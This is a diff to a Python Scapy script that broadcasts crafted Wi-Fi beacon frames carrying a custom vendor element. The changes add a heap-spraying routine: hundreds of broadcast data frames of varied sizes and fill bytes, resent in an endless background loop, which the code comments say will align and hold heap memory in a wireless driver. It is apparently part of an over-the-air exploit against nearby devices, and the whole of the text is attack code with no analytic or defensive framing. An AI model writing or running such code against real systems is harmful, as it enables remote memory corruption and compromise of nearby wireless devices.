@@ -26,6 +26,12 @@ clients = {}
 
 ACK_TIMEOUT = 1  # Timeout in seconds for waiting ACKs
 
+# Advanced strategy: Create and align multiple allocations to influence heap layout
+ADVANCED_ALLOCATION_COUNT = 300  # Number of allocations for heap spraying
+ADVANCED_PAYLOAD_SIZES = [500, 1000, 1500, 2000, 2500, 3000]  # More varied sizes for better control
+ADVANCED_PAYLOAD_CONTENTS = [b'\x00', b'\xff', b'\xaa', b'\x55', b'\x11', b'\xee']  # Additional content for heap control
+
+
 def set_interface_settings(interface, channel):
     os.system(f"sudo ifconfig {interface} down")
     os.system(f"sudo iw dev {interface} set type monitor")
@@ -61,6 +67,41 @@ def create_beacon(ssid, bssid, channel):
              create_element(221, CUSTOM_VSA)
     logging.debug(f"Beacon frame created: {beacon.summary()}")
     return beacon
+
+def create_useless_packet(payload_size, payload_content=b'\x00'):
+    seq = get_sequence_number()
+    logging.info(f"Creating useless packet with sequence number: {seq} and payload size: {payload_size}")
+    payload = payload_content * payload_size  # Consistent payload to ensure predictable heap behavior
+    useless_packet = RadioTap() / \
+                    Dot11(type=2, subtype=0, addr1="ff:ff:ff:ff:ff:ff", addr2=BSSID, addr3=BSSID, SC=seq << 4) / \
+                    LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / SNAP(OUI=b'\x00\x00\x00', code=0x0800) / \
+                    Raw(load=payload)
+    logging.debug(f"Useless packet created: {useless_packet.summary()}")
+    return useless_packet
+
+def send_useless_packets(interface, count=ADVANCED_ALLOCATION_COUNT, delay=0.05, maintain_interval=1.0):
+    logging.info(f"Sending {count} useless packets of varying sizes to align heap memory")
+    maintained_packets = []
+    for i in range(count):
+        try:
+            payload_size = ADVANCED_PAYLOAD_SIZES[i % len(ADVANCED_PAYLOAD_SIZES)]  # Cycle through different sizes
+            payload_content = ADVANCED_PAYLOAD_CONTENTS[i % len(ADVANCED_PAYLOAD_CONTENTS)]  # Cycle through different contents
+            packet = create_useless_packet(payload_size, payload_content)
+            sendp(packet, iface=interface, verbose=False)
+            maintained_packets.append(packet)
+            time.sleep(delay)  # Controlled delay to allow heap to stabilize
+        except Exception as e:
+            logging.error(f"Error sending useless packet: {e}")
+
+    # Maintain allocations to prevent the driver from freeing them
+    while True:
+        try:
+            for packet in maintained_packets:
+                sendp(packet, iface=interface, verbose=False)
+                logging.debug(f"Maintaining allocation with packet: {packet.summary()}")
+            time.sleep(maintain_interval)
+        except Exception as e:
+            logging.error(f"Error maintaining allocations: {e}")
 
 def create_probe_response(bssid, src_mac):
     seq = get_sequence_number()
@@ -133,6 +174,11 @@ def main():
     logging.info("Starting script...")
     try:
         set_interface_settings(INTERFACE, CHANNEL)
+
+        # Align heap with large useless packets and maintain allocations
+        spray_thread = threading.Thread(target=send_useless_packets, args=(INTERFACE,))
+        spray_thread.daemon = True
+        spray_thread.start()
 
         # Start sending beacons
         beacon_thread = threading.Thread(target=send_beacon, args=(INTERFACE,))
